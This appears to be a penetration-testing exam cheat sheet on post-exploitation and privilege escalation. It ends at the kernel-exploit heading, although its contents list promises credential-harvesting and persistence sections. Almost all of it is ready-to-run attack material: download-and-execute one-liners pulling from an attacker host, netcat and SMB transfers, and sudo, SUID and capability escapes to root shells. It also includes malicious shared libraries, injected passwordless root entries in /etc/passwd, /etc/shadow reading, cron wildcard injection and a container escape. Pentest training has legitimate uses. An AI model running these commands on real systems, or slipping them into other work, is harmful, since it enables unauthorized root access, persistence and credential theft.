# Post Exploitation & Privilege Escalation

## üéØ Goal

Turn a low-privilege shell or user access into¬†**root/SYSTEM**¬†and extract useful information and credentials for lateral movement.

---

## Table of Contents

1. [Immediate Context Gathering](#41-immediate-context-gathering)
2. [File Transfer Methods](#310-file-transfer-methods)
3. [Linux Automated Enumeration](#42-linux-automated-enumeration)
4. [Linux Manual Privilege Escalation](#43-linux-manual-privilege-escalation)
5. [Windows Automated Enumeration](#44-windows-automated-enumeration)
6. [Windows Manual Privilege Escalation](#45-windows-manual-privilege-escalation)
7. [Credential Harvesting & Lateral Movement](#46-credential-harvesting-lateral-movement)
8. [Proof Collection & Documentation](#47-proof-collection-documentation)
9. [Persistence Mechanisms](#48-persistence-mechanisms)

---

## üìã Phase Checklist

### Immediate Context Gathering

- [ ]¬†**Identity confirmed**¬†(`whoami`,¬†`id`,¬†`whoami /all`) ‚Üí¬†[4.1.1](#411-linux-identity-system-information)
- [ ]¬†**System information gathered**¬†(OS, version, architecture, hostname) ‚Üí¬†[4.1.1](#411-linux-identity-system-information), [4.4](#44-windows-automated-enumeration)
- [ ]¬†**Network configuration documented**¬†(IP, routes, connections) ‚Üí¬†[4.1.2](#412-linux-network-enumeration),¬†[4.4](#44-windows-automated-enumeration)
- [ ]¬†**Current privileges analyzed**¬†‚Üí¬†[4.1.1](#411-linux-identity-system-information), [4.5.1](#451-windows-token-privileges)

### File Transfer & Access Expansion
- [ ] **At least one reliable file transfer method verified (HTTP, SMB, NC, SCP, PowerShell, etc.)** ‚Üí [3.10](#310-file-transfer-methods)  
- [ ] **System searched for SSH private keys / authorized_keys and related artifacts** ‚Üí [3.11](#311-ssh-key-exploitation)  
- [ ] **Any recovered keys tested and, where viable, converted into stable SSH access** ‚Üí [3.11](#311-ssh-key-exploitation)  

### Linux Automated Enumeration

- [ ]¬†**linpeas.sh executed**¬†and output analyzed ‚Üí¬†[4.2.1](#421-linpeas-linux-privilege-escalation-awesome-script)
- [ ]¬†**lse.sh or LinEnum executed**¬†(alternative scanner) ‚Üí¬†[4.2.2](#422-linux-smart-enumeration-lse)¬†|¬†[4.2.3](#423-linenum)
- [ ]¬†**High/critical findings prioritized**¬†‚Üí¬†[4.2.4](#424-analyzing-automated-results)

### Linux Manual Privilege Escalation

- [ ]¬†**Sudo rights analyzed**¬†for misconfigurations ‚Üí¬†[4.3.1](#431-sudo-privilege-escalation)
- [ ]¬†**SUID/SGID binaries**¬†identified and tested ‚Üí¬†[4.3.2](#432-suidsgid-binary-exploitation)
- [ ]¬†**Linux Capabilities**¬†checked ‚Üí¬†[4.3.3](#433-linux-capabilities)
- [ ]¬†**Cron jobs**¬†examined for writable scripts ‚Üí¬†[4.3.4](#434-cron-job-exploitation)
- [ ]¬†**Writable files/paths**¬†exploited ‚Üí¬†[4.3.5](#435-writable-files-path-hijacking)
- [ ]¬†**PATH hijacking**¬†attempted ‚Üí¬†[4.3.5](#435-writable-files-path-hijacking)
- [ ]¬†**Kernel exploits**¬†researched (last resort) ‚Üí¬†[4.3.6](#436-kernel-exploits-last-resort)
- [ ]¬†**Container escape**¬†checked (if applicable) ‚Üí¬†[4.3.7](#437-container-escape)
- [ ]¬†**Interesting groups**¬†memberships exploited ‚Üí¬†[4.3.8](#438-interesting-group-memberships)
- [ ]¬†**NFS shares**¬†enumerated for no_root_squash ‚Üí¬†[4.3.9](#439-nfs-exploitation)
- [ ]¬†**Writable /etc/passwd or /etc/shadow**¬†‚Üí¬†[4.3.10](#4310-writable-etcpasswd-etcshadow)

### Windows Automated Enumeration

- [ ]¬†**winPEAS.exe executed**¬†and analyzed ‚Üí¬†[4.4.1](#441-winpeas-windows-privilege-escalation-awesome-script)
- [ ]¬†**PowerUp.ps1 or Seatbelt**¬†executed ‚Üí¬†[4.4.2](#442-powerup), [4.4.3](#443-seatbelt)
- [ ]¬†**Critical findings prioritized**¬†‚Üí¬†[4.4.4](#444-analyzing-automated-results)

### Windows Manual Privilege Escalation

- [ ]¬†**Token privileges**¬†examined (SeImpersonate, SeBackup, etc.) ‚Üí¬†[4.5.1](#451-windows-token-privileges)
- [ ]¬†**Service misconfigurations**¬†identified ‚Üí¬†[4.5.2](#452-service-exploitation)
- [ ]¬†**Unquoted service paths**¬†exploited ‚Üí¬†[4.5.2](#452-service-exploitation)
- [ ]¬†**Scheduled tasks**¬†analyzed for writable scripts ‚Üí¬†[4.5.3](#453-scheduled-tasks)
- [ ]¬†**AlwaysInstallElevated**¬†registry checked ‚Üí¬†[4.5.4](#454-alwaysinstallelevated)
- [ ]¬†**Registry autoruns**¬†examined ‚Üí¬†[4.5.5](#455-registry-exploitation)
- [ ]¬†**Weak file/folder permissions**¬†identified ‚Üí¬†[4.5.6](#456-file-directory-permissions)
- [ ]¬†**DLL hijacking opportunities**¬†investigated ‚Üí¬†[4.5.7](#457-dll-hijacking)
- [ ]¬†**Stored credentials**¬†extracted (if authorized) ‚Üí¬†[4.5.8](#458-credential-dumping)

### Credential Harvesting

- [ ]¬†**History files**¬†checked (`.bash_history`, PowerShell history, etc.) ‚Üí¬†[4.6.1](#461-history-files)
- [ ]¬†**Configuration files**¬†searched for passwords ‚Üí¬†[4.6.2](#462-configuration-files)
- [ ]¬†**Database credentials**¬†extracted ‚Üí¬†[4.6.3](#463-database-credentials)
- [ ]¬†**SSH keys**¬†collected ‚Üí¬†[4.6.4](#464-ssh-keys)
- [ ]¬†**Browser credentials**¬†extracted (if applicable) ‚Üí¬†[4.6.5](#465-browser-credentials)
- [ ]¬†**Memory dumps**¬†analyzed (if authorized) ‚Üí¬†[4.5.8](#458-credential-dumping)
- [ ]¬†**Credentials tested**¬†across multiple services ‚Üí¬†[4.6.6](#466-credential-reuse-password-spraying)

### Post-Exploitation Verification

- [ ]¬†**Proof files captured**¬†(root.txt, proof.txt) ‚Üí¬†[4.7.1](#471-proof-collection)
- [ ]¬†**Screenshot evidence**¬†collected ‚Üí¬†[4.7.1](#471-proof-collection)
- [ ]¬†**Full command chain documented**¬†‚Üí¬†[4.7.2](#472-documentation-requirements)
- [ ]¬†**Credentials organized**¬†for reporting ‚Üí¬†[4.7.2](#472-documentation-requirements)
- [ ]¬†**Lateral movement targets**¬†identified ‚Üí¬†[4.6.6](#466-credential-reuse-password-spraying)

### Persistence (If Required)

- [ ]¬†**Persistence mechanism**¬†established ‚Üí¬†[4.8.1](#481-linux-persistence)¬†|¬†[4.8.2](#482-windows-persistence)
- [ ]¬†**Backup access method**¬†created ‚Üí¬†[4.8.1](#481-linux-persistence)¬†|¬†[4.8.2](#482-windows-persistence)

---

## 4.1 Immediate Context Gathering

### 4.1.1 Linux Identity & System Information

**üë§ User Identity**

```bash
# Basic identity information
whoami
id
groups
who am i

# User details
cat /etc/passwd | grep $(whoami)
groups $(whoami)

# Environment variables
env
echo $PATH
echo $HOME
echo $USER

# Sudo capabilities
sudo -l
sudo -ll  # More verbose output

# Check if user has a shell
cat /etc/passwd | grep $(whoami) | grep -v nologin
```

**üíª System Information**

```bash
# Hostname
hostname
hostnamectl 2>/dev/null

# OS and kernel version
uname -a
uname -r
cat /proc/version
cat /etc/issue
cat /etc/*-release 2>/dev/null
lsb_release -a 2>/dev/null

# Architecture
arch
uname -m
lscpu | grep Architecture
getconf LONG_BIT

# Distribution info
cat /etc/os-release 2>/dev/null
cat /etc/lsb-release 2>/dev/null

# Check for virtualization
systemd-detect-virt 2>/dev/null
dmidecode -s system-manufacturer 2>/dev/null
```

**‚è∞ System Time & Timezone**

```bash
date
timedatectl 2>/dev/null
cat /etc/timezone 2>/dev/null
uptime
```

### 4.1.2 Linux Network Enumeration

```bash
# Network interfaces and IPs
ip a
ifconfig 2>/dev/null
ip addr show
ip link show

# Routing table
ip route
ip route show
route -n
netstat -rn

# ARP cache
ip neigh
arp -a 2>/dev/null

# Active connections
ss -tulpn
ss -antp
netstat -tulpn 2>/dev/null
netstat -antp 2>/dev/null

# DNS
cat /etc/resolv.conf
cat /etc/hosts

# Firewall rules
iptables -L -n 2>/dev/null
iptables -L -n -v 2>/dev/null
```

### 4.1.3 Linux Process & Service Enumeration

```bash
# Running processes
ps aux
ps -ef
ps auxww
ps -eo user,pid,ppid,cmd

# Process tree
pstree -p
ps auxf

# Services
systemctl list-units --type=service --state=running 2>/dev/null
service --status-all 2>/dev/null
chkconfig --list 2>/dev/null

# Listening ports and services
ss -tulpn
lsof -i -P -n 2>/dev/null
```

### 4.1.4 Linux User & Group Enumeration

```bash
# All users
cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd

# Users with login shells
cat /etc/passwd | grep -v nologin | grep -v false

# Current logged-in users
w
who
who -a
last
lastlog 2>/dev/null

# Groups
cat /etc/group
getent group

# Privileged groups
cat /etc/group | grep -E "sudo|wheel|admin|root"

# Check specific group memberships
for user in $(cat /etc/passwd | cut -d: -f1); do groups $user; done

# Recently created users
sort -nk3 -t: /etc/passwd | tail -n 5
```

---

## 4.2 File Transfer Methods

### Linux File Transfer

**HTTP Server (Python):**

```bash
# Python 3
python3 -m http.server 80

# Python 2
python -m SimpleHTTPServer 80

# Updog (better alternative)
updog -p 80

# Download on target
wget http://<LHOST>/file
curl http://<LHOST>/file -o file
```

**Netcat Transfer:**

```bash
# On attacker (sender)
nc -nlvp 4444 < file

# On target (receiver)
nc <LHOST> 4444 > file

# Alternative (sender on target)
nc <LHOST> 4444 < file

# Receiver on attacker
nc -nlvp 4444 > file
```

**Base64 Transfer:**

```bash
# On attacker
base64 file -w 0  # Copy output

# On target
echo "<BASE64_STRING>" | base64 -d > file
```

**SCP:**

```bash
# Upload to target
scp file user@<RHOST>:/tmp/file

# Download from target
scp user@<RHOST>:/path/to/file .
```

**PHP File Download:**

```php
<?php file_put_contents("file.txt", file_get_contents("http://<LHOST>/file.txt")); ?>
```

### Windows File Transfer

**PowerShell Download:**

```powershell
# Download file
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>/file.exe', 'C:\Temp\file.exe')"

# Download and execute in memory
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')"

# Alternative
powershell -c "Invoke-WebRequest -Uri 'http://<LHOST>/file.exe' -OutFile 'C:\Temp\file.exe'"
powershell -c "wget 'http://<LHOST>/file.exe' -OutFile 'file.exe'"

# Bypass execution policy
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')"
```

**Certutil:**

```cmd
certutil -urlcache -f http://<LHOST>/file.exe file.exe
certutil -urlcache -split -f http://<LHOST>/file.exe file.exe
```

**BITSAdmin:**

```cmd
bitsadmin /transfer myDownloadJob /download /priority normal http://<LHOST>/file.exe C:\Temp\file.exe
```

**SMB Transfer:**

```bash
# On attacker (start SMB server)
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share . -smb2support -username user -password pass

# On Windows target
copy \\<LHOST>\share\file.exe C:\Temp\file.exe
net use \\<LHOST>\share /user:user pass
```

**FTP Transfer:**

```bash
# On attacker
python -m pyftpdlib -p 21 -w

# On Windows target
echo open <LHOST> > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

**VBScript Download (Old Windows):**

```vb
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

cscript wget.vbs http://<LHOST>/file.exe file.exe
```

---

## 4.2 Linux Automated Enumeration

### 4.2.1 LinPEAS (Linux Privilege Escalation Awesome Script)

**üöÄ Download & Execute**

```bash
# Download directly from GitHub
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Download and save
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# Quick mode (skip time-consuming checks)
./linpeas.sh -a | tee linpeas_quick.txt

# Specific checks only
./linpeas.sh -s  # Superfast mode
./linpeas.sh -P  # Password checks only

# With colors in file
./linpeas.sh -a 2>&1 | tee linpeas_output.txt

# Transfer via base64 (if no download capability)
# On attacker:
base64 -w0 linpeas.sh
# On target:
echo "<BASE64_STRING>" | base64 -d > linpeas.sh
chmod +x linpeas.sh
```

**‚ö†Ô∏è Important Notes:**

- **DO NOT**¬†use the automatic exploitation feature during exams
- Focus on manual verification of findings
- LinPEAS output can be overwhelming - prioritize red/yellow findings
- Always save output for later analysis

### 4.2.2 Linux Smart Enumeration (LSE)

```bash
# Download
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
chmod +x lse.sh

# Level 0 (basic)
./lse.sh -l0 | tee lse_l0.txt

# Level 1 (interesting findings)
./lse.sh -l1 | tee lse_l1.txt

# Level 2 (detailed)
./lse.sh -l2 | tee lse_l2.txt

# Specific checks
./lse.sh -c  # Check for specific CVEs
```

### 4.2.3 LinEnum

```bash
# Download
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh

# Execute with thorough mode
./LinEnum.sh -t | tee linenum_output.txt

# Keyword search
./LinEnum.sh -k password | tee linenum_passwords.txt

# Export findings
./LinEnum.sh -e export_linenum.txt
```

### 4.2.4 Analyzing Automated Results

**Priority Order:**

1. **CRITICAL**¬†(Red) - Immediate privilege escalation vectors
    - Writable /etc/passwd or /etc/shadow
    - Sudo NOPASSWD entries
    - SUID binaries in unusual locations
2. **HIGH**¬†(Yellow/Orange) - Likely privilege escalation
    - Interesting SUID binaries
    - Writable cron jobs
    - Readable sensitive files
3. **MEDIUM**¬†- Potential vectors requiring more investigation
    - Kernel exploit suggestions
    - Interesting capabilities
    - NFS exports

**Quick Grep for Critical Findings:**

```bash
# Search output for critical keywords
grep -i "password" linpeas_output.txt
grep -i "root" linpeas_output.txt
grep -i "NOPASSWD" linpeas_output.txt
grep -i "Writable" linpeas_output.txt
grep -E "SUID|SGID" linpeas_output.txt
```

---

## 4.3 Linux Manual Privilege Escalation

### 4.3.1 Sudo Privilege Escalation

**üîç Enumerate Sudo Rights**

```bash
# Check sudo permissions
sudo -l
sudo -ll  # Verbose

# Check sudo version for CVEs
sudo -V | head -n1
sudo --version

# Common sudo version vulnerabilities
# CVE-2021-3156 (Baron Samedit) - sudo < 1.9.5p2
# CVE-2019-14287 - sudo < 1.8.28
```

**üéØ Common Sudo Misconfigurations**

|Sudo Entry|GTFOBins Exploitation|Priority|
|---|---|---|
|`(ALL) NOPASSWD: ALL`|Direct root:¬†`sudo su`|CRITICAL|
|`NOPASSWD: /bin/bash`|`sudo /bin/bash`|CRITICAL|
|`NOPASSWD: /bin/sh`|`sudo /bin/sh`|CRITICAL|
|`NOPASSWD: /usr/bin/vim`|`sudo vim -c ':!/bin/sh'`|HIGH|
|`NOPASSWD: /usr/bin/vi`|`sudo vi -c ':!/bin/sh' /dev/null`|HIGH|
|`NOPASSWD: /usr/bin/nano`|`sudo nano`¬†then¬†`^R^X`¬†then¬†`reset; sh 1>&0 2>&0`|HIGH|
|`NOPASSWD: /usr/bin/find`|`sudo find /etc -exec /bin/sh \;`|HIGH|
|`NOPASSWD: /usr/bin/nmap`|`sudo nmap --interactive`¬†then¬†`!sh`|HIGH|
|`NOPASSWD: /usr/bin/awk`|`sudo awk 'BEGIN {system("/bin/sh")}'`|HIGH|
|`NOPASSWD: /usr/bin/perl`|`sudo perl -e 'exec "/bin/sh";'`|HIGH|
|`NOPASSWD: /usr/bin/python*`|`sudo python -c 'import os; os.system("/bin/sh")'`|HIGH|
|`NOPASSWD: /usr/bin/less`|`sudo less /etc/hosts`¬†then¬†`!sh`|HIGH|
|`NOPASSWD: /usr/bin/more`|`sudo more /etc/hosts`¬†then¬†`!sh`|HIGH|
|`NOPASSWD: /usr/bin/git`|`sudo git -p help`¬†then¬†`!sh`|HIGH|
|`NOPASSWD: /usr/bin/ftp`|`sudo ftp`¬†then¬†`!/bin/sh`|MEDIUM|
|`NOPASSWD: /usr/bin/zip`|`sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"`|MEDIUM|
|`NOPASSWD: /usr/bin/tar`|`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`|MEDIUM|
|`NOPASSWD: /usr/bin/rsync`|`sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`|MEDIUM|

**üìö GTFOBins Methodology**

```bash
# Always check GTFOBins: https://gtfobins.github.io/

# General pattern for many binaries:
sudo <BINARY> <FLAGS_TO_SPAWN_SHELL>

# Examples:
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash";'
sudo ruby -e 'exec "/bin/bash"'
sudo lua -e 'os.execute("/bin/bash")'
sudo php -r 'system("/bin/bash");'

# Text editors pattern:
# vim: :!/bin/bash or :set shell=/bin/bash then :shell
# less/more/man: !bash
# nano: ^R^X then reset; sh 1>&0 2>&0
```

**üî• Sudo LD_PRELOAD Exploitation**

```bash
# Check for LD_PRELOAD in sudo -l output
sudo -l | grep LD_PRELOAD

# If env_keep+=LD_PRELOAD is set:
# Create malicious library
cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# Compile
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles

# Execute with any sudo command
sudo LD_PRELOAD=/tmp/shell.so <ANY_SUDO_COMMAND>
```

**‚ö° Sudo Token Hijacking (CVE-2019-14287)**

```bash
# If (ALL, !root) is set, run as ANY user except root
# But user ID -1 (or 4294967295) is interpreted as 0 (root)
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash
```

### 4.3.2 SUID/SGID Binary Exploitation

**üîç Finding SUID/SGID Binaries**

```bash
# Find SUID binaries (owned by root)
find / -perm -4000 -type f -user root 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Find both SUID and SGID
find / -type f -perm -6000 2>/dev/null
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null

# Compare with a known good list
find / -perm -4000 2>/dev/null | diff - /path/to/known_suid_list.txt

# Find SUID owned by current user (rare but useful)
find / -user $(whoami) -perm -4000 2>/dev/null
```

**üéØ Common Exploitable SUID Binaries**

|Binary|Exploitation Method|Command|
|---|---|---|
|`/bin/bash`¬†or¬†`/bin/sh`|Preserve privileges|`bash -p`¬†or¬†`sh -p`|
|`find`|Execute commands|`find /etc -exec /bin/sh -p \;`|
|`vim`|Shell escape|`vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'`|
|`nmap`|Interactive mode (old)|`nmap --interactive`¬†then¬†`!sh -p`|
|`less`¬†/¬†`more`|Shell escape|`less /etc/hosts`¬†then¬†`!/bin/sh -p`|
|`nano`|Shell escape|`nano`¬†then¬†`^R^X`¬†then¬†`reset; sh -p 1>&0 2>&0`|
|`cp`|Overwrite sensitive files|`cp /etc/passwd /tmp/passwd && echo 'newroot::0:0:root:/root:/bin/bash' >> /tmp/passwd && cp /tmp/passwd /etc/passwd`|
|`mv`|Move sensitive files|Similar to cp|
|`python`¬†/¬†`python3`|Execute code|`python -c 'import os; os.setuid(0); os.system("/bin/bash -p")'`|
|`perl`|Execute code|`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash -p";'`|
|`ruby`|Execute code|`ruby -e 'Process::Sys.setuid(0); exec "/bin/bash -p"'`|
|`php`|Execute code|`php -r 'system("id");'`|
|`gcc`¬†/¬†`g++`|Compile malicious code|See below|
|`awk`|Execute commands|`awk 'BEGIN {system("/bin/bash -p")}'`|
|`sed`|Limited RCE|`sed -n '1e id' /etc/hosts`|
|`git`|Shell escape|`git help status`¬†then¬†`!/bin/bash -p`|
|`tar`|Arbitrary file write|See below|
|`zip`|Execute code|`zip /tmp/test.zip /tmp/test -T --unzip-command="sh -p -c /bin/bash -p"`|
|`unzip`|Execute code|Similar to zip|
|`systemctl`|Service manipulation|See below|
|`taskset`|Execute as root|`taskset 1 /bin/sh -p`|
|`strace`|Process manipulation|`strace -o /dev/null /bin/bash -p`|
|`time`|Execute commands|`time /bin/bash -p`|
|`ionice`|Execute commands|`ionice /bin/bash -p`|
|`watch`|Execute commands|`watch -x /bin/bash -p`|

**üí• SUID Exploitation Examples**

**bash with SUID:**

```bash
/bin/bash -p
# or
/bin/sh -p
# -p flag preserves the effective UID
```

**Custom SUID Binary Analysis:**

```bash
# Check what the binary does
strings /path/to/suid_binary | less
ltrace /path/to/suid_binary
strace /path/to/suid_binary

# Check for relative path execution
strings /path/to/suid_binary | grep -E "^[^/]"

# If it calls a command without absolute path - PATH hijacking
export PATH=/tmp:$PATH
echo '/bin/bash -p' > /tmp/<command_name>
chmod +x /tmp/<command_name>
/path/to/suid_binary
```

**gcc/g++ SUID Exploitation:**

```bash
# If gcc/g++ has SUID, compile a setuid shell
cat > /tmp/setuid.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    setuid(0); setgid(0); system("/bin/bash -p");
}
EOF

gcc /tmp/setuid.c -o /tmp/setuid
chmod +s /tmp/setuid
/tmp/setuid
```

**tar SUID (Arbitrary File Write):**

```bash
# Create malicious tar archive
echo 'root::0:0:root:/root:/bin/bash' > /tmp/passwd_entry
tar -cvf /tmp/exploit.tar /tmp/passwd_entry --transform 's|.*/||'

# Extract to overwrite /etc/passwd (if writable)
cd /etc
tar -xvf /tmp/exploit.tar
```

**systemctl SUID:**

```bash
# Create malicious service
cat > /tmp/root.service << EOF
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'chmod +s /bin/bash'
[Install]
WantedBy=multi-user.target
EOF

systemctl link /tmp/root.service
systemctl start root
/bin/bash -p
```

### 4.3.3 Linux Capabilities

**üîç Enumerating Capabilities**

```bash
# Find all files with capabilities
getcap -r / 2>/dev/null

# More thorough search
/sbin/getcap -r / 2>/dev/null

# Check specific file
getcap /path/to/binary

# Check capabilities of running processes
cat /proc/<PID>/status | grep Cap
```

**üéØ Exploitable Capabilities**

|Capability|Exploitation|Priority|
|---|---|---|
|`cap_setuid`|Set UID to 0 (root)|CRITICAL|
|`cap_setgid`|Set GID to 0|CRITICAL|
|`cap_sys_admin`|Mount filesystems, manipulate namespaces|HIGH|
|`cap_dac_read_search`|Bypass file read permission checks|HIGH|
|`cap_dac_override`|Bypass file write permission checks|HIGH|
|`cap_fowner`|Bypass permission checks on file operations|MEDIUM|
|`cap_net_raw`|Use RAW and PACKET sockets|MEDIUM|
|`cap_net_admin`|Network administration|MEDIUM|

**üí• Capability Exploitation Examples**

**cap_setuid on Python:**

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**cap_setuid on Perl:**

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**cap_setuid on PHP:**

```bash
php -r "posix_setuid(0); system('/bin/bash');"
```

**cap_setuid on Ruby:**

```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

**cap_dac_read_search on tar:**

```bash
# Read any file (including /etc/shadow)
tar -cvf /tmp/shadow.tar /etc/shadow
tar -xvf /tmp/shadow.tar -O
# or
tar -xf /tmp/shadow.tar -C /tmp
cat /tmp/etc/shadow
```

**cap_sys_admin (Container Escape):**

```bash
# If in a container with cap_sys_admin
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "chmod +s /bin/bash" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
/bin/bash -p
```

### 4.3.4 Cron Job Exploitation

**üîç Cron Enumeration**

```bash
# System-wide crontabs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/* 2>/dev/null
cat /etc/cron.daily/* 2>/dev/null
cat /etc/cron.hourly/* 2>/dev/null
cat /etc/cron.weekly/* 2>/dev/null
cat /etc/cron.monthly/* 2>/dev/null

# User crontabs
crontab -l
crontab -u <username> -l 2>/dev/null
ls -la /var/spool/cron/
ls -la /var/spool/cron/crontabs/

# Check for anacron
cat /etc/anacrontab 2>/dev/null

# Cron logs
cat /var/log/cron.log 2>/dev/null
grep CRON /var/log/syslog 2>/dev/null

# Monitor cron execution in real-time
tail -f /var/log/syslog | grep CRON

# Check systemd timers (modern alternative to cron)
systemctl list-timers --all
systemctl status <timer>
```

**üéØ Cron Exploitation Vectors**

**1. Writable Cron Scripts:**

```bash
# Find writable scripts referenced in cron
for i in $(cat /etc/crontab | grep -v "^#" | cut -f 7 -d ' '); do
    if [ -w "$i" ]; then
        echo "Writable: $i"
    fi
done

# Inject malicious code
echo 'chmod +s /bin/bash' >> /path/to/writable/script.sh
# Wait for cron to execute
/bin/bash -p
```

**2. PATH Hijacking in Cron:**

```bash
# If cron uses relative paths (e.g., "service.sh" instead of "/usr/bin/service.sh")
# Create malicious script in PATH
echo '#!/bin/bash' > /tmp/service.sh
echo 'chmod +s /bin/bash' >> /tmp/service.sh
chmod +x /tmp/service.sh

# Modify PATH if cron doesn't specify it
# Wait for execution
```

**3. Wildcard Injection in Cron tar/rsync:**

```bash
# If cron runs: tar czf /backups/backup.tar.gz *
cd /target/directory

# Create checkpoint files
echo '#!/bin/bash' > shell.sh
echo 'chmod +s /bin/bash' >> shell.sh
chmod +x shell.sh

touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

# Wait for cron execution
/bin/bash -p
```

**4. Cron with Writable PATH Variable:**

```bash
# If /etc/crontab has a writable directory in PATH
# Check PATH in crontab
grep PATH /etc/crontab

# Create malicious binary
echo '#!/bin/bash' > /writable/path/command
echo 'chmod +s /bin/bash' >> /writable/path/command
chmod +x /writable/path/command
```

**5. Monitoring for Cron Jobs (pspy):**

```bash
# Download pspy to monitor processes without root
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64

# Or use while loop
while true; do ps aux | grep -v grep; sleep 1; done
```

### 4.3.5 Writable Files & PATH Hijacking

**üîç Finding Writable Files**

```bash
# World-writable files
find / -writable -type f 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"
find / -perm -2 -type f 2>/dev/null

# World-writable directories
find / -writable -type d 2>/dev/null
find / -perm -2 -type d 2>/dev/null

# Files writable by current user
find / -user $(whoami) -writable 2>/dev/null

# Critical writable files
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
ls -la /etc/crontab

# Writable scripts executed by root
find /usr/local/bin /usr/bin /bin /sbin -writable -type f 2>/dev/null
```

**üéØ PATH Hijacking**

```bash
# Check current PATH
echo $PATH

# Find writable directories in PATH
for dir in $(echo $PATH | tr ':' ' '); do
    ls -ld "$dir" 2>/dev/null | grep -w "w"
done

# If a script runs without absolute path
# Example: script calls "service" instead of "/usr/sbin/service"

# Create malicious binary
echo '#!/bin/bash' > /tmp/service
echo 'chmod +s /bin/bash' >> /tmp/service
chmod +x /tmp/service

# Modify PATH
export PATH=/tmp:$PATH

# Execute the vulnerable script
./vulnerable_script.sh

# Get root shell
/bin/bash -p
```

**üí• Library Hijacking (LD_LIBRARY_PATH)**

```bash
# Check if binary uses relative library paths
ldd /path/to/binary

# Create malicious library
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c

# Set LD_LIBRARY_PATH and execute
LD_LIBRARY_PATH=/tmp /path/to/vulnerable_binary
```

### 4.3.6 Kernel Exploits (Last Resort)

**‚ö†Ô∏è WARNING:**¬†Kernel exploits can crash systems. Always test in isolated environment first.

